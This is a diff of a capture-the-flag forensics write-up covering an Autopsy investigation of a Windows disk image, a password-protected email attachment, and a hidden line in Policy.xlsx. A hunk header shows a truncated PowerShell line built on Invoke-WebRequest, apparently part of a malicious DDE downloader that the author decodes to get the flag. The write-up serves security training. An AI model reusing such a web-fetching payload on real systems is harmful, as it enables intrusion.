@@ -7,7 +7,7 @@ tags = [
 ]
 +++
 
-*Was in 2023, not 2022 since event delayed. Great CTF with a lot of challenges from the team **idek** ¯\_(ツ)_/¯. My team WolvSec came in **17th** out of **846** teams. I will be going over my 2 Forensics solves and 5 OSINT. Currently just Forensics 1, plan to add rest later!
+*Was in 2023, not 2022 since event delayed. Great CTF with a lot of challenges from the team **idek** ¯\_(ツ)_/¯. My team WolvSec came in **17th** out of **846** teams. I will be going over my 2 Forensics solves and 5 OSINT. Currently just Forensics 1, I plan to add the rest later!
 
 
 <!--more-->
@@ -27,7 +27,7 @@ We're pretty sure there's been a hack into our system. The incident is suspected
 
 We are given a `.vhdx` file, which contains a Windows Image. To open in Autopsy, I double clicked the file on my Windows machine and imported that disk image. The first thing that struck my eye when doing this was the email saved onto the machine.
 
-{{< img src="idek-CTF-2022/autopsyemail.png" >}}
+{{< img src="autopsyemail.png" >}}
 
 The email HTML gives us the password `Privacy4411@2023!!!`. This can be used to open the attachment in the email, which gives us a file `Policy.xlsx`. In this file my teammates and I tried to find anything meaningful, even performing stego on the image of Tommy Xiaomi but with no success. I noticed a weird line on page 3, which was hidden, but it did not show correct output on google sheets since the file was converted. However, `doubledelete` was able to view the line
 ```
@@ -54,7 +54,7 @@ $p='http://';$v=Invoke-Web...
 
 And there we see a `$flag` variable, signaling this is likely our flag. Running just that and printing we get a pastebin:
 
-{{< img src="idek-CTF-2022/tiooutput.png" >}}
+{{< img src="tiooutput.png" >}}
 
 And we get the flag! As well as the resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within
 
